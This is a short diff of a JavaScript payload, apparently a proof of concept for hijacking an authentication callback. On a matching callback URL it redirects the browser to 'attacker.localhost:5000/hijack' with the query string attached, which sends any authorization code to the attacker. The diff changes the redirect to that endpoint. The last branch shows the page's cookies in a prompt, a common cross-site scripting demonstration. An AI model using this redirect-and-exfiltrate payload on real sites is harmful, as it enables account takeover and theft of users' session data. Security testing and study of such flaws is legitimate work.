@@ -1,7 +1,7 @@
 if (location.href.includes("/ekyb/callback?code=1234567")) {
   window.location.replace("https://example.com" + location.search);
 } else if (location.href.includes("/ekyb/callback")) {
-  window.location.replace("http://attacker.localhost" + location.search);
+  window.location.replace("http://attacker.localhost:5000/hijack" + location.search);
 }
 else {
   prompt(document.cookie)
